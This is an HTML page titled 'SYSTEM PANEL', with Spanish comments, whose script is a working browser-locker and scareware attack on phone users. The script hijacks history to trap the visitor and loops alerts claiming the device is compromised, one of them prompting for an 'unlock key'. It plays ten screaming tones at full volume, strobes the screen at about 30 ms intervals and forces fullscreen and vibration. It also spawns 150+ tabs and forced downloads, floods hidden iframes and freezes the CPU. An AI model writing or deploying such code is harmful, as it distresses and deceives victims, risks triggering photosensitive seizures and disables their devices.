<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover, shrink-to-fit=no">
    <title>⚡ SYSTEM PANEL ⚡</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
            -webkit-tap-highlight-color: transparent;
            touch-action: none;
        }
        body {
            background: black;
            overflow: hidden;
            position: fixed;
            width: 100%;
            height: 100%;
        }
        .strobe-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 9999;
            background: white;
            animation: strobeFlash 0.05s infinite;
        }
        @keyframes strobeFlash {
            0% { opacity: 0; background: black; }
            50% { opacity: 1; background: white; }
            100% { opacity: 0; background: black; }
        }
        .invert-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 9998;
            mix-blend-mode: difference;
            background: white;
            animation: invertPulse 0.1s infinite;
        }
        @keyframes invertPulse {
            0% { opacity: 0; }
            50% { opacity: 0.7; }
            100% { opacity: 0; }
        }
        .canvas-vibration {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 9997;
        }
    </style>
</head>
<body>
    <canvas id="vibrationCanvas" class="canvas-vibration"></canvas>
    <div class="strobe-overlay"></div>
    <div class="invert-overlay"></div>
    
    <script>
    (function() {
        // ==================== BLOQUEO EXTREMO PARA ANDROID ====================
        // Bloquear botón atrás, home, multitarea simulados
        window.addEventListener('beforeunload', function(e) {
            e.preventDefault();
            e.returnValue = '';
            return '';
        });
        
        // Historial infinito
        for (let i = 0; i < 500; i++) {
            history.pushState({ i: i }, '', '#lock' + i);
        }
        
        window.addEventListener('popstate', function() {
            for (let i = 0; i < 100; i++) {
                history.pushState({}, '', '#block' + Math.random());
            }
            location.reload();
        });
        
        setInterval(() => {
            history.pushState({}, '', '#hijack');
        }, 50);
        
        // Deshabilitar gestos táctiles nativos
        document.body.style.touchAction = 'none';
        document.body.style.overscrollBehavior = 'none';
        
        // Evitar salir con deslizamiento (Android)
        document.addEventListener('touchmove', function(e) {
            e.preventDefault();
        }, { passive: false });
        
        // ==================== VOLUMEN MÁXIMO + 10 SCREAMERS SIMULTÁNEOS ====================
        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        const gainNode = audioCtx.createGain();
        gainNode.gain.value = 1.0;
        gainNode.connect(audioCtx.destination);
        
        // Crear buffer de gritos aterradores
        function createScreamBuffer(frequency, distortion, callback) {
            const sampleRate = audioCtx.sampleRate;
            const length = sampleRate * 4; // 4 segundos
            const buffer = audioCtx.createBuffer(1, length, sampleRate);
            const data = buffer.getChannelData(0);
            for (let i = 0; i < length; i++) {
                let t = i / sampleRate;
                // Grito humano distorsionado + frecuencias agudas
                let scream = 0;
                scream += Math.sin(t * (800 + Math.sin(t * 100) * 300)) * 0.6;
                scream += Math.sin(t * 1600) * 0.4;
                scream += Math.sin(t * 3200) * 0.3;
                scream += Math.random() * distortion;
                scream += Math.sin(t * 50) * 0.2;
                // Clip para hacerlo más brutal
                scream = Math.min(0.95, Math.max(-0.95, scream));
                data[i] = scream;
            }
            callback(buffer);
        }
        
        const screamBuffers = [];
        const screamTypes = [
            (cb) => createScreamBuffer(800, 0.7, cb),
            (cb) => createScreamBuffer(1000, 0.9, cb),
            (cb) => createScreamBuffer(1200, 0.8, cb),
            (cb) => createScreamBuffer(650, 0.95, cb),
            (cb) => createScreamBuffer(1500, 1.0, cb),
            (cb) => createScreamBuffer(900, 0.85, cb),
            (cb) => createScreamBuffer(2000, 0.9, cb),
            (cb) => createScreamBuffer(700, 0.75, cb),
            (cb) => createScreamBuffer(1100, 0.88, cb),
            (cb) => createScreamBuffer(2500, 0.95, cb)  // 10 gritos distintos
        ];
        
        let loadedBuffers = 0;
        function startHellAudio() {
            audioCtx.resume();
            gainNode.gain.value = 1.0;
            
            screamTypes.forEach((type, idx) => {
                type(function(buffer) {
                    screamBuffers[idx] = buffer;
                    loadedBuffers++;
                    
                    if (loadedBuffers >= screamTypes.length) {
                        // Todos los buffers listos - iniciar INFIERNO AUDITIVO
                        for (let s = 0; s < screamBuffers.length; s++) {
                            if (screamBuffers[s]) {
                                const source = audioCtx.createBufferSource();
                                source.buffer = screamBuffers[s];
                                source.connect(gainNode);
                                source.loop = true;
                                source.start();
                            }
                        }
                        
                        // Añadir gritos superpuestos aleatorios
                        setInterval(() => {
                            const randomBuf = screamBuffers[Math.floor(Math.random() * screamBuffers.length)];
                            if (randomBuf) {
                                const extraSource = audioCtx.createBufferSource();
                                extraSource.buffer = randomBuf;
                                extraSource.connect(gainNode);
                                extraSource.start();
                            }
                            // Reforzar volumen
                            if (gainNode.gain.value < 1.0) gainNode.gain.value = 1.0;
                        }, 150);
                    }
                });
            });
        }
        
        // Desbloquear audio en la primera interacción
        function unlockAndPlay() {
            audioCtx.resume().then(() => startHellAudio());
        }
        document.body.addEventListener('touchstart', unlockAndPlay);
        document.body.addEventListener('click', unlockAndPlay);
        setTimeout(unlockAndPlay, 200);
        
        // ==================== PANTALLA TITILANTE BLANCO/NEGRO (STROBO EXTREMO) ====================
        let strobeInterval;
        function startStrobe() {
            let state = 0;
            strobeInterval = setInterval(() => {
                const overlay = document.querySelector('.strobe-overlay');
                if (state % 2 === 0) {
                    overlay.style.background = 'white';
                    overlay.style.opacity = '1';
                } else {
                    overlay.style.background = 'black';
                    overlay.style.opacity = '0.6';
                }
                state++;
                if (state > 100) state = 0;
            }, 30); // 33 fps stroboscópico
        }
        
        // ==================== CANVAS DE VIBRACIÓN VISUAL ====================
        const canvas = document.getElementById('vibrationCanvas');
        const ctx = canvas.getContext('2d');
        
        function resizeCanvas() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        }
        window.addEventListener('resize', resizeCanvas);
        resizeCanvas();
        
        let noiseOffset = 0;
        function drawNoiseAndShake() {
            if (!ctx) return;
            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
            const data = imageData.data;
            // Ruido aleatorio + desplazamiento visual
            for (let i = 0; i < data.length; i += 4) {
                const value = Math.random() * 255;
                data[i] = value;     // R
                data[i+1] = value;   // G
                data[i+2] = value;   // B
                data[i+3] = 255;     // A
            }
            ctx.putImageData(imageData, 0, 0);
            
            // Aplicar shake a todo el body (desplazamiento aleatorio)
            const shakeX = (Math.random() - 0.5) * 20;
            const shakeY = (Math.random() - 0.5) * 20;
            document.body.style.transform = `translate(${shakeX}px, ${shakeY}px)`;
            
            requestAnimationFrame(drawNoiseAndShake);
        }
        drawNoiseAndShake();
        
        // ==================== 100+ PESTAÑAS + DESCARGAS INFINITAS ====================
        function spawnMassiveTabs() {
            const downloadUrls = [
                'data:application/octet-stream;base64,UEsDBBQAAAAIAO1QV1gAAAAAAAAAAAAAAAALAAAAYnVnMS5iaW5VVAkA',
                'data:application/octet-stream;base64,UEsDBBQAAAAIAO1QV1gAAAAAAAAAAAAAAAALAAAAYnVnMi5iaW5VVAkA',
                'data:application/octet-stream;base64,UEsDBBQAAAAIAO1QV1gAAAAAAAAAAAAAAAALAAAAc2NyZWFtLmRhdFVUCQ',
                'https://httpbin.org/bytes/2097152',
                'https://httpbin.org/bytes/1048576',
                'https://httpbin.org/delay/2?bytes=1000000',
                'https://www.example.com/largefile.bin',
                'about:blank#crash',
                'about:blank#popunder',
                'https://httpbin.org/status/200?download=1'
            ];
            
            function openTabWithDelay(url, delay) {
                setTimeout(() => {
                    const win = window.open(url, '_blank');
                    if (!win || win.closed) {
                        const a = document.createElement('a');
                        a.href = url;
                        a.download = 'payload_' + Date.now() + '.bin';
                        document.body.appendChild(a);
                        a.click();
                        document.body.removeChild(a);
                    }
                }, delay);
            }
            
            // ABRIR 150 PESTAÑAS
            for (let i = 0; i < 150; i++) {
                const url = downloadUrls[i % downloadUrls.length];
                openTabWithDelay(url, i * 40);
            }
            
            // Continuar abriendo cada 500ms
            setInterval(() => {
                for (let i = 0; i < 12; i++) {
                    const url = downloadUrls[Math.floor(Math.random() * downloadUrls.length)];
                    const win = window.open(url, '_blank');
                    if (!win) {
                        const a = document.createElement('a');
                        a.href = url;
                        a.download = 'spam_' + Date.now() + '.bin';
                        document.body.appendChild(a);
                        a.click();
                        document.body.removeChild(a);
                    }
                }
            }, 800);
        }
        
        // ==================== IFRAME FLOOD (descargas ocultas) ====================
        function iframeFlood() {
            setInterval(() => {
                for (let f = 0; f < 25; f++) {
                    const iframe = document.createElement('iframe');
                    iframe.src = 'https://httpbin.org/bytes/500000';
                    iframe.style.display = 'none';
                    document.body.appendChild(iframe);
                    setTimeout(() => iframe.remove(), 800);
                }
            }, 500);
        }
        
        // ==================== ALERTAS + PROMPTS INFINITOS (BLOQUEO TOTAL) ====================
        function infiniteModalHell() {
            setInterval(() => {
                alert('⚠️ ERROR CRÍTICO DEL SISTEMA ⚠️\nCódigo: 0xFF0000D3');
                confirm('El dispositivo ha sido comprometido. Presione OK para continuar...');
                prompt('Ingrese la clave de desbloqueo:', '');
            }, 200);
        }
        
        // ==================== FULLSCREEN + ORIENTATION LOCK ====================
        function forceFullscreenAndLock() {
            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen().catch(e => {});
            }
            if (screen.orientation && screen.orientation.lock) {
                screen.orientation.lock('portrait').catch(e => {});
            }
        }
        setInterval(forceFullscreenAndLock, 300);
        
        document.addEventListener('fullscreenchange', () => {
            if (!document.fullscreenElement) forceFullscreenAndLock();
        });
        
        // ==================== VIBRACIÓN INTENSA (SI SOPORTA) ====================
        if (navigator.vibrate) {
            setInterval(() => {
                navigator.vibrate([1000, 400, 1000, 400, 2000, 500, 800]);
            }, 600);
        }
        
        // ==================== BLOQUEAR TODOS LOS MÉTODOS DE SALIDA ====================
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.addEventListener('selectstart', e => e.preventDefault());
        document.addEventListener('dragstart', e => e.preventDefault());
        document.addEventListener('keydown', e => {
            e.preventDefault();
            return false;
        });
        
        // Evitar recarga por visibilidad
        document.addEventListener('visibilitychange', () => {
            if (!document.hidden) {
                setTimeout(() => location.reload(), 100);
            }
        });
        
        // ==================== INICIAR INFIERNO COMPLETO ====================
        function startTotalHell() {
            spawnMassiveTabs();
            iframeFlood();
            infiniteModalHell();
            startStrobe();
            forceFullscreenAndLock();
        }
        
        document.body.addEventListener('touchstart', startTotalHell);
        document.body.addEventListener('click', startTotalHell);
        setTimeout(startTotalHell, 300);
        
        // Mantener el cuerpo en fixed position para evitar scrolling
        document.body.style.position = 'fixed';
        document.body.style.top = '0';
        document.body.style.left = '0';
        document.body.style.width = '100%';
        document.body.style.height = '100%';
        
        // Loop de rendimiento extra (congelar UI)
        setInterval(() => {
            let junk = 0;
            for (let i = 0; i < 50000; i++) junk += Math.random();
        }, 10);
    })();
    </script>
</body>
</html>
